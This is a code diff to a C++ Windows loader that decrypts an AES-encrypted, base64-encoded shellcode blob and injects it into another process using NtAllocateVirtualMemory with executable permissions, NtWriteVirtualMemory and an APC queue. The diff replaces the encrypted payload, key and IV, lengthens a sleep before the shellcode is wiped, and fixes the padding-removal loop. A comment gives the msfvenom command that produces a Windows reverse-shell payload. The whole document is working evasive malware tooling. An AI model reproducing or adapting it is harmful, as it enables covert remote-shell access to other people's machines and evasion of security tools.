@@ -77,13 +77,13 @@ VOID hollow(std::vector<byte> payload)
 
     mem = nullptr;
     SIZE_T p_size = payload.size();
-    NtAllocateVirtualMemory(hProcess, &mem, 0, (PULONG)&p_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    NtAllocateVirtualMemory(hProcess, &mem, 0, (PSIZE_T)&p_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
     NtWriteVirtualMemory(hProcess, mem, payload.data(), payload.size(), 0);
     NtQueueApcThread(hThread, (PKNORMAL_ROUTINE)mem, mem, NULL, NULL);
     NtResumeThread(hThread, NULL);
 
     // Overwrite shellcode with null bytes
-    Sleep(1500);
+    Sleep(10000);
     uint8_t overwrite[500];
     NtWriteVirtualMemory(hProcess, mem, overwrite, sizeof(overwrite), 0);
 
@@ -105,16 +105,16 @@ int main()
 
     // Decode shellcode and load into uint8_t vector for decryption
     // msfvenom -p windows/x64/shell_reverse_tcp LHOST=127.0.0.1 LPORT=443 -f raw >> 64b_443_localhost_revshell.bin
-    shellcode = "z33lrIYAG7pcIAZfrX7cRKLyNwr1w+zD1pSGQXA/0emhQBn2C1z5SjOjyGu5FL2Wrq3xADX+MDyaZs/F8BIBXcqPK1TFdESehzl8uO8+NT+Mda0BjZSGUcd0qs3PO4klwSOhSDrlTUhjCe9+7QoaFc8g0yTIGiAP674VA6URsKd9y0szNTBgSgn/L6gB2WpfGQ4UBaHGDiQ8GwrzedHh/eTbhZtS2/9HEoVqkoAqG2gts1rWt4ckzvEJRM8v4zJxLzMEtNnf3e9TBaG1CNfWCWg+SPIfW2L6SLUA16EadwwSihhKk84KGQyTEgQ9Ue1/VMt30TREUC46P3IvidPVG6LgIQs5pHXYEPPBBV2vCufLCQ3F6ChFwMhZJvzRF/30P6+POoyFAMHvwSrebSGiliwWgrqcAvRPuWxcu3T5DdqEXoDzESk75W8n4kGZWI3cgiVvDpTt3vFST2gdW7j2ri75T0P5Ut1HWAxGr75ir68RX4HB8Mli78eP6UcLuFHULrz5W0tpA3yyefUapF7mK+gGbuFZ6pyLRrkG2XWLmo1Ji1/2yGzuHQ0Q4HacssCuN/peqkKbm++unMiu/D3lGlH2KGdCBhBEubVULKFFvZ0=";
-
+    shellcode = "5WJDDSbb0Kh7+npFtMpwoO6jJwQ6LKvoys6rZ9I+LFIfr6sCjINscuKryZ3q7PKKSkEwiF2DQQYDYJyNGP+LCc3xF3RIlCrrM5TPrze2E64GKNJwmmLLpvGGAM6B0xrp3OARcAgXzksNxR2mmXx1CFgJfc+pe0xsUQylgSEW9lmZsjifE87bs9XEz45SwmBKAJyR3UE0PZyjsr/FqWmZN0W0sLWsiQPo618CepCkfq5ZVF/V2iUR6+y7XQPlz2WfprshOaGqv48o6AKVMwLAyJ6iqVq2X8LzagEdGLzOUVXkJAgzntp0e7C9IgxW8O1THI0dB9GDjsn+tS1gitYLJ+7lUEYBVnrjCWB2IaQdDiRJ+5ZK/R8F6whOITEf+VpB/EJ1DofH56MDbGo+WkDzsdHnG2drtiYTXXdweqGiJzCBwYNjzGB2s4xW8JfKWjBvDerO22TBbpp21/AJDtHt/eaLXmzjsVxPT5GNF2lZkQf04VQVpoFKV1VvSPEhFVeT1vRN+f6e6XCiMSU8ziPbl9B5kgYrRq51TOD4zmuOysGa4Klt51nnmyxFsq/4Xx4kOioZTf2/oJ7X7UUVFaM0YqwHht5Vaf6RmnGVwwooxAnqx2MdnJTx2dhoCk3MxVMTDtt7sdwiAYIM4Ekr4rXRntmCHebl17bbVdqBdTZM/u9Ggh7le4gemOdT4ag2WRhEVTbbiTRCsarVmIPWeB17p5qzw0XbyweWNl/kOJZsaaHKOnR3Zy0mG9a8SORmJTs/E7nPpb5gVFiaSdwDPs3qRklNbZwd+QbL6LJdCZsDMuY69z93X2gyHc60yVpcJTGd07iqwotmCIf80AlcpjjrkiTy5xwT7s62dE7Gs/ZphRuRHHS9UCLwqC85dBY08fqalmvoC59EdwXw8y+YFD2kC3vDtELY0hM4kZ+669al0XytP+22ju3mbmA2agv4Axr7xUo8eXxVA1Ov6exWymhnq92CqhGbh7tFcL9Zcq2431M5K2k3ZmGUVxiHZRyfOZv6ZopIrp81P6jtUNkQN9Ud51HMuh4iVrZsbMZ+Bo6W506roPSQCIYZUiz7rOq4Ai+omnaY+5+sRZ+QllV8t6cZhY+vipbX6+p+QMzhGYLDFJJKK6Zql3Zo49EZetF3rgItGea/d5QTYwCATPjrMeHjvSkapak7ifC54+hWLvq9QDukoWaT+3BirHHDZHvhlguVpk+MwENoLACsZiJ/sH9ylA==";
     decoded = b64.base64_decode(shellcode);
     ciphertext.clear();
     std::copy(decoded.begin(), decoded.end(), std::back_inserter(ciphertext));
 
     // AES Decryption Objects
     struct AES_ctx e_ctx;
-    uint8_t iv[] = { 0x89,0x54,0x7f,0x64,0xc0,0xce,0x3a,0x44,0xf0,0xee,0xaf,0x1,0xa8,0xdc,0x6b,0x65 };
-    uint8_t key[] = { 0x70,0x76,0x20,0xf2,0x3f,0x4c,0x4c,0x10,0x45,0xfb,0x50,0x93,0xd8,0xd1,0xc9,0xfb,0x6c,0x30,0x45,0x88,0xdd,0xb2,0xf4,0xaf,0x9c,0x1c,0x22,0x13,0x26,0x67,0x24,0xbd };
+    uint8_t key[32] = {0x9e,0x91,0x45,0x7a,0xa1,0x32,0xe1,0x09,0x16,0xb2,0x09,0xee,0xff,0x6f,0x7a,0x44,0xfd,0xd8,0x12,0x90,0xd7,0xd0,0xdf,0x39,0x0a,0x46,0x7b,0x9a,0x52,0xe8,0x2e,0xd6};
+    uint8_t iv[16] = {0xdb,0x03,0xef,0xe3,0xcf,0xb6,0x5a,0x33,0xe2,0x6b,0x41,0x51,0xc2,0xd2,0xb4,0x46};
+    
     AES_init_ctx_iv(&e_ctx, key, iv);
 
     // DECRYPT
@@ -124,9 +124,14 @@ int main()
     recovered.clear();
 
     // Remove the padding from the decypted plaintext
-    for (int i = 0; i < ciphertext.size(); i++)
+    SIZE_T c_size = ciphertext.size();
+    for (int i = 0; i < c_size; i++)
     {
-        if (ciphertext[i] == 0x90 && ciphertext[i + 1] == 0x90)
+        if (ciphertext[i] == 0x90 && i == (c_size - 1))
+        {
+            break;
+        }
+        else if (ciphertext[i] == 0x90 && ciphertext[i + 1] == 0x90)
         {
             break;
         }
